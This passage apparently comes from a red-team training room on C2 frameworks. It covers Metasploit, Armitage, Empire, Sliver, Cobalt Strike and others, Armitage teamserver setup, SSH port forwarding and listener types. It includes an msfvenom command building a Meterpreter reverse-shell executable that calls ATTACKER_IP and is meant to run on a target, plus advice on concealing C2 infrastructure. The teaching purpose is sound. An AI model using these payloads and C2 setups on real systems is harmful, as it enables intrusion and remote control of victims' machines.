## Common C2 Frameworks

Throughout your journey, you may encounter many different C2 Frameworks; we will discuss a few popular C2 Frameworks that are widely used by Red Teamers and Adversaries alike. We will be dividing this into two sections:

- Free
- Premium/Paid

You may ask some questions like “Why would I use a premium or paid C2 framework?”, and this is an excellent question. Premium/Paid C2 frameworks usually are less likely to be detected by Anti-Virus vendors. This is not to say that it's impossible to be detected, just that open-source C2 projects are generally well understood, and signatures can be easily developed.

Usually, premium C2 frameworks generally have more advanced post-exploitation modules, pivoting features, and even feature requests that open-source software developers may sometimes not fulfill. For example, one feature Cobalt Strike offers that most other C2 frameworks do not is the ability to open a VPN tunnel from a beacon. This can be a fantastic feature if a Proxy does not work well in your specific situation. You must do your research to find out what will work best for your team.

## Free C2 Frameworks

**Metasploit**

The [Metasploit Framework](https://www.metasploit.com/), developed and maintained by Rapid7, is one of the most popular Exploitation and Post Exploitation frameworks (C2) that is publicly available and is installed on most penetration testing distributions.

MSFConsole

```shell-session
root@kali$ msfconsole
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.1.12-dev                          ]
+ -- --=[ 2177 exploits - 1152 auxiliary - 399 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View a module's description using 
info, or the enhanced version in your browser with 
info -d

msf6 > 
```

**Armitage**

[Armitage](https://web.archive.org/web/20211006153158/http://www.fastandeasyhacking.com/) is an extension of the Metasploit Framework - it adds a Graphical user interface and is written in Java, and is incredibly similar to Cobalt Strike. This is because they were both developed by Raphael Mudge. Armitage offers an easy way to enumerate and visualize all of your targets. Aside from looking a lot like Cobalt Strike, it even offers some unique features. One of the most popular can be found in the “Attacks” menu; This feature is known as the Hail Mary attack, which attempts to run all exploits for the services running on a specific workstation. Armitage really is “Fast and Easy Hacking”.

![A Screenshot of the Armitage UI](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/6fc808991c2ea5a5faae2a271f9bf907.png)

**Powershell Empire/Starkiller**

[Powershell Empire](https://bc-security.gitbook.io/empire-wiki/) and [Starkiller](https://github.com/BC-SECURITY/Starkiller) is another incredibly popular C2 originally created by Harmjoy, Sixdub, and Enigma0x3 from Veris Group. Currently, the project has been discontinued and has been picked up by the BC Security team (Cx01N, Hubbl3, and _Vinnybod). Empire features agents written in various languages compatible with multiple platforms, making it an incredibly versatile C2. For more information on Empire, we recommend you take a look at the [Powershell Empire](https://tryhackme.com/room/rppsempire) room.

![A Screenshot of the Starkiller UI](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/7605d1d88a01604402dcde1878a8acd0.png)

**Covenant**

[Covenant](https://github.com/cobbr/Covenant) by Ryan Cobb is the last free C2 Framework we will be covering - By far, it is one of the most unique C2 Frameworks being written in C#. Unlike Metasploit/Armitage, It’s primarily used for post-exploitation and lateral movement with HTTP, HTTPS, and SMB listeners with highly customizable agents.

![A Screenshot of the Covenant UI](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/55f84861830c1bc50d2b251bda883019.PNG)

**Sliver**

[Sliver](https://github.com/BishopFox/sliver) by [Bishop Fox](https://bishopfox.com/) is an advanced, highly customizable multi-user, CLI-based C2 framework. Sliver is written in Go, which makes reverse engineering the C2 "implants" incredibly difficult. It supports various protocols for C2 communications like WireGuard, mTLS, HTTP(S), DNS, and much more. Additionally, it supports BOF files for additional functionality, DNS Canary Domains for masking C2 communications, automatic Let's Encrypt certificate generation for HTTPS beacons, and much more.  

![A Screenshot of the Sliver UI](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/9447257966d025c8927541a7adab9113.png)

## Paid C2 Frameworks

**Cobalt Strike**

[Cobalt Strike](https://www.cobaltstrike.com/) by Help Systems (Formerly created by Raphael Mudge) is arguably one of the most famous Command and Control frameworks next to Metasploit. Much like Artimage, it is written in Java and designed to be as flexible as possible. For more information, see Cobalt Strike’s [Video Training Page](https://www.youtube.com/playlist?list=PLcjpg2ik7YT6H5l9Jx-1ooRYpfvznAInJ). It offers additional insight into both Red Team Operations and the Framework by Raphael Mudge himself.

![A screenshot of the Cobalt Strike UI](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/573e8581dd1be594cf674cbf06271cde.png)

**Brute Ratel**

[Brute Ratel](https://bruteratel.com/) by Chetan Nayak or Paranoid Ninja is a Command and Control framework marketed as a “Customizable Command and Control Center” or “C4” framework that provides a true adversary simulation-like experience with being a unique C2 framework. For more information about the Framework, the author has provided a [Video Training Page](https://bruteratel.com/tabs/tutorials/) that demonstrates many of the capabilities within the framework.

![Screenshot of the Brute Ratel UI - Source: https://bruteratel.com/](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/4afab434ea1d36584a5f7d0d7b8c2ad1.jpeg)

## Other C2 Frameworks

For a more comprehensive list of C2 Frameworks and their capabilities, check out the “[C2 Matrix](https://howto.thec2matrix.com/)”, a project maintained by **Jorge Orchilles** and **Bryson Bort**. It has a far more comprehensive list of almost all C2 Frameworks that are currently available. We highly recommend that after this room, you go check it out and explore some of the other C2 Frameworks that were not discussed in this room.

# Setting Up a C2 Framework
## Let's Setup a C2 Server

In order to gain a better understanding of what is required to set up and administer a C2 server, we will be using Armitage. As a reminder, Armitage is a GUI for the Metasploit Framework, and because of this, it has almost all aspects of a standard C2 framework.

_**Note:** In case you're using the AttackBox, you may skip to the **Preparing our Environment** section._

### Setting Up Armitage

**Downloading, Building, and Installing Armitage**

First, we must clone the repository from Gitlab:

Installing Armitage

```shell-session
root@kali$ git clone https://gitlab.com/kalilinux/packages/armitage.git && cd armitage
Cloning into 'armitage'...
remote: Enumerating objects: 760, done.
remote: Counting objects: 100% (160/160), done.
remote: Compressing objects: 100% (100/100), done.
remote: Total 760 (delta 55), reused 152 (delta 54), pack-reused 600
Receiving objects: 100% (760/760), 11.81 MiB | 8.55 MiB/s, done.
Resolving deltas: 100% (244/244), done.
```

Next up, we must build the current release; we can do so with the following command:

Building Armitage

```shell-session
root@kali$ bash package.sh
+ ./gradlew assemble

> Task :armitage:compileJava
Note: Some input files use or override a deprecated API.
Note: Recompile with -Xlint:deprecation for details.
Note: Some input files use unchecked or unsafe operations.
Note: Recompile with -Xlint:unchecked for details.

Deprecated Gradle features were used in this build, making it incompatible with Gradle 7.0.
Use '--warning-mode all' to show the individual deprecation warnings.
See https://docs.gradle.org/6.8/userguide/command_line_interface.html#sec:command_line_warnings

BUILD SUCCESSFUL in 12s
6 actionable tasks: 6 executed
+ for i in unix windows mac
+ '[' unix == mac ']'
+ mkdir -p release/unix
+ cp build.txt license.txt readme.txt whatsnew.txt release/unix
+ cp build/armitage.jar build/cortana.jar release/unix
+ cp -r dist/unix/armitage dist/unix/armitage-logo.png dist/unix/teamserver release/unix
+ '[' unix == mac ']'
+ for i in unix windows mac
+ '[' windows == mac ']'
+ mkdir -p release/windows
+ cp build.txt license.txt readme.txt whatsnew.txt release/windows
+ cp build/armitage.jar build/cortana.jar release/windows
+ cp -r dist/windows/armitage.exe release/windows
+ '[' windows == mac ']'
+ for i in unix windows mac
+ '[' mac == mac ']'
++ uname
+ '[' Linux '!=' Darwin ']'
+ echo 'Skipping macOS build because this is not running on Darwin'
Skipping macOS build because this is not running on Darwin
```

After the building process finishes, the release build will be in the `./releases/unix/` folder.  You should check and verify that Armitage was able to be built successfully.

Verifying Build

```shell-session
root@kali$ cd ./release/unix/ && ls -la
total 11000
drwxr-xr-x 2 root root    4096 Feb  6 20:20 .
drwxr-xr-x 4 root root    4096 Feb  6 20:20 ..
-rwxr-xr-x 1 root root      75 Feb  6 20:20 armitage
-rw-r--r-- 1 root root 4334705 Feb  6 20:20 armitage.jar
-rw-r--r-- 1 root root   25985 Feb  6 20:20 armitage-logo.png
-rw-r--r-- 1 root root     282 Feb  6 20:20 build.txt
-rw-r--r-- 1 root root 6778470 Feb  6 20:20 cortana.jar
-rw-r--r-- 1 root root    1491 Feb  6 20:20 license.txt
-rw-r--r-- 1 root root    4385 Feb  6 20:20 readme.txt
-rwxr-xr-x 1 root root    2665 Feb  6 20:20 teamserver
-rw-r--r-- 1 root root   85945 Feb  6 20:20 whatsnew.txt
```

In this folder, there are two key files that we will be using:

**Teamserver**

This is the file that will start the Armitage server that multiple users will be able to connect to. This file takes two arguments:

- IP Address
    

Your fellow Red Team Operators will use the IP Address to connect to your Armitage server.

-  Shared Password

Your fellow Red Team Operators will use the Shared Password to access your Armitage server.

**Armitage**  
This is the file you will be using to connect to the Armitage Teamserver. Upon executing the binary, a new prompt will open up, displaying connection information and your username (this should be treated as a nickname, not a username for authentication) and password.

![Armitage's Connection Info GUI](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/628edce404a27f170a34d3a9d9464d1c.png)

_**Note:** Again, before if you are using the AttackBox, you may skip this section and go straight into the **Starting and Connecting Armitage** section._

## Preparing our Environment

Before we can launch Armitage, we must do a few pre-flight checks to ensure Metasploit is configured properly. Armitage relies heavily on Metasploit's Database functionality, so we must start and initialize the database before launching Armitage. In order to do so, we must execute the following commands:

Starting PostgreSQL

```shell-session
root@kali$ systemctl start postgresql && systemctl status postgresql
postgresql.service - PostgreSQL RDBMS
   Loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendor preset: enabled)
   Active: active (exited) since Sun 2022-02-06 20:16:03 GMT; 41min ago
  Process: 1587 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
 Main PID: 1587 (code=exited, status=0/SUCCESS)

Feb 06 20:16:03 ip-10-10-142-239 systemd[1]: Starting PostgreSQL RDBMS...
Feb 06 20:16:03 ip-10-10-142-239 systemd[1]: Started PostgreSQL RDBMS.
```

Lastly, set the `MSF_DATABASE_CONFIG` environment variable to the location of your Metasploit **database.yml** file, which in our case is at `/root/.msf4/database.yml`.

Setting Environment Varibale

```shell-session
root@kali$ export MSF_DATABASE_CONFIG=/root/.msf4/database.yml
```

After that, we can finally start the Armitage Team Server. 

## Starting and Connecting to Armitage

Starting Armitage's Team Server

```shell-session
root@kali$ cd /opt/armitage/release/unix && ./teamserver YourIP P@ssw0rd123
[*] Generating X509 certificate and keystore (for SSL)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Starting RPC daemon
[*] MSGRPC starting on 127.0.0.1:55554 (NO SSL):Msg...
[*] MSGRPC backgrounding at 2022-02-06 17:47:08 -0500...
[*] MSGRPC background PID 2083
[*] sleeping for 20s (to let msfrpcd initialize)
[*] Starting Armitage team server
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Use the following connection details to connect your clients:
        Host: 127.0.0.2
        Port: 55553
        User: msf
        Pass: P@ssw0rd123

[*] Fingerprint (check for this string when you connect):
        d211e51c8886113433f63b588fd5ccfc9e323059
[+] hacking is such a lonely thing, until now
```

Once your Teamserver is up and running, we can now start the Armitage client. This is used to connect to the Teamserver and displays the GUI to the user.

Starting Armitage

```shell-session
root@kali$ cd /opt/armitage/release/unix && ./armitage
[*] Used the incumbent: 10.10.69.193
[*] Starting Cortana on 10.10.69.193
[*] Starting Cortana on 10.10.69.193
[*] Creating a default reverse handler... 0.0.0.0:8836

```

When operating a C2 Framework, you never want to expose the management interface publicly; You should always listen on a local interface, never a public-facing one. This complicates access for fellow operators. Fortunately, there is an easy solution for this. For operators to gain access to the server, you should create a new user account for them and enable SSH access on the server, and they will be able to SSH port forward TCP/55553.  Armitage **explicitly denies** users listening on 127.0.0.1; this is because it is essentially a shared Metasploit server with a "Deconfliction Server" that when multiple users are connecting to the server, you're not seeing everything that your other users are seeing. With Armitage, you must listen on your tun0/eth0 IP Address.

![Modify the Host IP Address to whatever you set in the previous step, "Starting Armitage's Team Server".](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/250523e0ea93b10e42c3515c6b812609.png)

After clicking "Connect", you will be prompted to enter a nickname. You can set this to whatever you like; only your fellow Red Team Operators will see it.

![Armitage's UI to put in a custom nickname](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/67465eb4ae28c1f7d57452b6b632314c.png)

After a moment or two, the Armitage UI should open up, until we start interacting with remote systems; it will look bare. In the next upcoming task, we will be exploiting a vulnerable virtual machine to get you more accustomed to the Armitage UI and how it can be used.

![The Armitage UI](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/fca62d124845af393a71e38e9eb94edb.png)

Now that Armitage is set up and working correctly, in the next task, we will learn more about securely accessing Armitage (as described above), creating listeners, various listener types, generating payloads, and much more!

# C2 Operation Basic
## Accessing and Managing Your C2 Infrastructure

Now that we have a general idea of how to set up a C2 Server, we will go over some basic operational details that you should know when accessing your C2 Server. It's important to note that you are not required to perform any actions in this task - This is meant to gain general experience and familiarity with Command and Control Frameworks.

## Basic Operational Security

We briefly touched on this in the last section; You should never have your C2 management interface directly accessible. This is primarily for you to improve operational security. It can be incredibly easy to fingerprint C2 servers. For example, in versions prior to 3.13, Cobalt Strike C2 servers were able to be identified by an extra space (\x20) at the end of the HTTP Response. Using this tactic, many Blue Teamers could fingerprint all of the Cobalt Strike C2 servers publicly accessible. For more information on fingerprinting and identifying Cobalt Strike C2 Servers, check out this posted on the [Recorded Future blog](https://www.recordedfuture.com/cobalt-strike-servers/).

![Screenshot from a Hex Editor depicting the extra space at the end of an HTTP Response](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/e81ca61b06e861e6f3a4f58660cc2e76.png)

The point in mentioning this is that you want to reduce your operational security risk as much as possible. If this means not having the management interface for your C2 server publicly accessible, then, by all means, you should do it.

## Accessing Your Remote C2 Server That's Listening Locally

This section will be focusing on how to securely access your C2 server by SSH port-forwarding; if you have port-forwarded with SSH before, feel free to skip over this section, you may not learn anything new. For those unfamiliar, SSH port-forwarding allows us to either host resources on a remote machine by forwarding a local port to the remote server, or allows us to access local resources on the remote machine we are connecting to.  In some circumstances, this may be for circumventing Firewalls.

![Firewall Blocks TCP/8080](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/bc96eabae5235e893e22417d2cc2301f.png)

Or, in our instance, this could be done for operational security reasons.

![Firewall Allows TCP/22, allowing us to access TCP/8080 over TCP/22](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/7edda600836d41987311316908354439.png)

Now that we have a better understanding of why we want to SSH port forward, let's go over the how.

In our C2 set up from Task 4, our Teamserver is listening on localhost on TCP/55553. In order to access Remote port 55553, we must set up a Local port-forward to forward our local port to the remote Teamserver server. We can do this with the -L flag on our SSH client:

SSHPort Forward

```shell-session
root@kali$ ssh -L 55553:127.0.0.1:55553 root@192.168.0.44
root@kali$ echo "Connected" 
Connected
```

Now that we have an SSH remote port forward set up, you can now connect to your C2 server running on TCP/55553. As a reminder, Armitage does not support listening on a loopback interface (127.0.0.1-127.255.255.255), so this is general C2 server admin advice. You will find this advice more centric to C2 servers like Covenant, Empire, and many others.

We highly recommend putting firewall rules in place for C2 servers that must listen on a public interface so only the intended users can access your C2 server. There are various ways to do this. If you are hosting Cloud infrastructure, you can set up a Security Group or use a host-based firewall solution like UFW or IPTables.

**Creating a Listener in Armitage**

Next, we're going to move onto a topic that all C2 servers have - this being listener creation. To stay on topic, we will demonstrate how to set up a basic listener with Armitage then explore some of the other theoretical listeners you may encounter in various other C2 Frameworks. Let's create a basic Meterpreter Listener running on TCP/31337. To start, click on the Armitage dropdown and go over to the "Listeners" section; you should see three options, Bind, Reverse, and set LHOST. Bind refers to Bind Shells; you must connect to these hosts. Reverse refers to standard Reverse Shells; this is the option we will be using.  

![Creating a Listener in Armitage](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1ad92c6b503433e43a906c0d6719f137.png)

After clicking "Reverse," a new menu will open up, prompting you to configure some basic details about the listener, specifically what port you want to listen on and what listener type you would like to select. There are two options you can choose from, "Shell" or "Meterpreter". Shell refers to a standard netcat-style reverse shell, and Meterpreter is the standard Meterpreter reverse shell.

![Configuring the Listener](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/f1799890a05592fcc5338efd4edf281b.png)

After pressing enter, a new pane will open up, confirming that your listener has been created. This should look like the standard Metasploit exploit/multi/handler module.

![Listener successfully configured](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/7bc806ea13495e55eb82fc5c399d8876.png)

After setting up a listener, you can generate a standard windows/meterpreter/reverse_tcp reverse shell using MSFvenom and set the LHOST to the Armitage server to receive callbacks to our Armitage server. 

**Getting a Callback**

MSFVenom Payload Generation

```shell-session
root@kali$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

After generating the windows/meterpreter/reverse_tcp using MSFVenom, we can transfer the payload to a target machine and execute it. After a moment or two, you should receive a callback from the machine.

![Callback from the Victim](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d5a2b006986bf3508047664/room-content/1dcc8962d5a595690a9b5ea9c4888dad.png)

## Listener Type

As previously mentioned, standard reverse shell listeners are not the only ones that exist; there are many varieties that use many different protocols; however, there are a few common ones that we will cover, these being the following:

**Standard Listener**

These often communicate directly over a raw TCP or UDP socket, sending commands in cleartext. Metasploit has full support for generic listeners.

**HTTP/HTTPS Listeners**

These often front as some sort of Web Server and use techniques like Domain Fronting or Malleable C2 profiles to mask a C2 server. When specifically communicating over HTTPS, it's less likely for communications to be blocked by an NGFW. Metasploit has full support for HTTP/HTTPS listeners.

**DNS Listener**

DNS Listeners are a popular technique specifically used in the exfiltration stage where additional infrastructure is normally required to be set up, or at the very least, a Domain Name must be purchased and registered, and a public NS server must be configured. It is possible to set up DNS C2 operations in Metasploit with the help of additional tools. For more information, see this "[Meterpreter over DNS](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_SintsovAndreyanov_MeterpreterReverseDNS.pdf)" presentation by Alexey Sintsov and Maxim Andreyanov. These are often very useful for bypassing Network Proxies.

**SMB Listener**

Communicating via SMB named pipes is a popular method of choice, especially when dealing with a restricted network; it often enables more flexible pivoting with multiple devices talking to each other and only one device reaching back out over a more common protocol like HTTP/HTTPS. Metasploit has support for Named Pipes.

